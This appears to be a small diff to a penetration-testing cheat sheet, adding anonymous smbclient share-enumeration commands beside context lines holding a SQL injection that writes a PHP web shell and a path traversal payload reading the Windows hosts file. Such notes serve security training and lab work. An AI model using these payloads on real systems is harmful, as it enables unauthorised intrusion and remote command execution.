@@ -103,5 +103,9 @@ udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL
 # Window 
 ```
 ?page=../../../../../../../../windows/system32/drivers/etc/hosts
-
+```
+### smbclient
+```
+smbclient -N -L \\\\10.129.2.102\\
+smbclient -N -L \\\\10.129.2.102\\backups
 ```
